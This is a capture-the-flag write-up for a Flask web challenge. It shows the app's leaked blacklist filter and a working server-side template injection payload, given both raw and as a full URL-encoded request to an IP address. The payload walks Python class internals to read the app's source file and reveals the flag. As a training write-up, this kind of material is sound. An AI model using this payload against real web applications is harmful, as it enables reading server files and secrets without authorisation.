# Some Chemistry - Web

### Points : #
### Solved : #

###### Files :
None

######  Hints
None

---


# Walkthrough

After clicking on the link provided in the description of the challenge, the page just asks us to wait for a transaction to be terminated in order to get the flag from this flask.

Once we try to play around the url, we easily hit an error page since the debug mode has been activated in which we can see the following code block.

```
    def secure(s):
        s = s.replace('(', ' (').replace(')', ')')
 
        blacklist = ['config','self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist])+s
    if(flask.render_template_string(secure(index))=='None'):
        return 'Nice Try !!'
    else:
```

TaDa! It's all about template Injection. Any input that we submit as a suffix to the url may be rendered as a template if we add the curly braces.



We just throw in the following in order to retrieve the content of *app.py*

_{{''.__class__.__mro__[2].__subclasses__()[40]('/app/app.py').read()}}_

```
http://149.56.110.180:5000/%7B%7B%20''.__class__.__mro__[2].__subclasses__()[40]('/app/app.py').read()%20%7D%7D
```

Result :

```
app = flask.Flask(__name__)
app.config['FL44G'] = 'HZVII{n0t_S3cure_fl4sK_4pp}'
```


## Flag

HZVII{n0t\_S3cure\_fl4sK\_4pp}



